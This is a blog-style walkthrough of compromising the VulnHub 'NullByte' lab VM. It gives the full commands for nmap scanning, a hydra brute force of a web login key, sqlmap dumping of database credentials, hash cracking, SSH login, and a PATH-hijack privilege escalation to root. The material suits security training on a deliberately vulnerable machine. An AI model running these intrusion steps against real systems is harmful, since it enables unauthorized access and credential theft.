---
title: "Null Byte Writeup"
date: 2020-04-08T10:51:52+02:00
draft: false
Tags: [
    "Writeups",
    "Vulnhub",
]
---
Download VM [here](https://www.vulnhub.com/entry/nullbyte-1,126/).

Run it on virtualbox, and let's get started.

### 0. Get VM's IP:
* ``$ nmap -sn 192.168.1.0/24``
![our machine's ip >> 192.168.1.142](/images/nullbyte/1.png)

### 1. Enumeration:
Now we can continue to scan the machine and the running services.
  * Using Zenmap (GUI nmap) : ``$ nmap -T4 -A -v 192.168.1.142``
![](/images/nullbyte/2.png)

As you can see there are :
* Apache server running on port 80 
* rpcbind on port 111 
* ssh on port 777 

### 2. Web Enumeration:
* let's see the web app running on apache 
![](/images/nullbyte/3.png)

* let's discover any directories using dirbuster >> found nothing usefull
![](/images/nullbyte/4.png)

* let's inspect and check the picture in the page, maybe something hidden.

  * download it :
![it's a gif](/images/nullbyte/main.gif)

* using ``strings`` command or ``exiftool`` >> got this string ``kzMb5nVYJw``
![](/images/nullbyte/6.png)
![](/images/nullbyte/7.png)

### let's try openning that string as a directory: 
  * got this page with login function and needs a key
![](/images/nullbyte/8.png)

From it's source code it seems that the key isn't that hard and we can brute force it
![](/images/nullbyte/9.png)

So let's use ``hydra`` for that job and you could use burpsuite's intruder too.
```yml
usage : hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
$ hydra 192.168.1.142 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /home/sehs/Desktop/stuff/rockyou.txt -la
```
![](/images/nullbyte/10.png)

we got the password >> ``elite``

Now let's login and see
![](/images/nullbyte/11.png)

It's a search function, by typing any letters or just enter >> you get this:
![some names from a database](/images/nullbyte/12.png)

### 3. Exploitation:
* let's check this database and see what we could get, using sqlmap tool:

`` $ sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch= --dbs ``

![](/images/nullbyte/13.png)
And we got these databases.

* let's discover them:
  * mysql

``$ sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=a --batch --dump -C User,Password -T user -D mysql``

![nothing useful here](/images/nullbyte/14.png)
  * seth

``$ sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch= --dump --columns --tables -D seth``

![](/images/nullbyte/15.png)

ramses' password looks interesting ``YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE``

* let's decrypt it as base64 :
  * `` $ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE= | base64 -d`` 
  * we got this md5 hash : ``c6d6bd7ebf806f43c76acc3681703b81`` cracking it online gives >> ``omega``
![](/images/nullbyte/16.png)

### Getting back to the ssh service running 
* let's try this user and his password and see if it works
  * ``$ ssh ramses@192.168.1.142 -p 777``
  * password: omega
* notice it's runnig on port 777 not it's default 22
![](/images/nullbyte/17.png)

And yeah we got a connection..

let's see our privileges here >> just a user not root
![](/images/nullbyte/18.png)

let's roam into the system and see what we could find
![](/images/nullbyte/19.png)

we could read his bash history >> and here he had executed this file ``procwatch`` in this path ``/var/www/backup``
![](/images/nullbyte/20.png)

- so let's go there and see
![](/images/nullbyte/21.png)
![](/images/nullbyte/22.png)

* This file is just running ps command (process status) to display the running processes inside a shell (sh)..
  * So we have an executable, that's running ps as root and ps is really just a file in /bin, and $PATH sets the directories.

Where executables located:
![](/images/nullbyte/23.png)

### Then we could manipulate this environment variables and get procwatch to run sh instead of ps, and this should give us a root shell :D
```java
ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup$ export PATH="/var/www/backup:$PATH"
```
![](/images/nullbyte/24.png)

This ln command creates a symlink to sh called ps followed by setting up the path to the current directory which gave us a shell :D

Got root access :) , opening /root/proof.txt >> gave us the flag and we are done here...
![](/images/nullbyte/25.png)

* hope you enjoyed...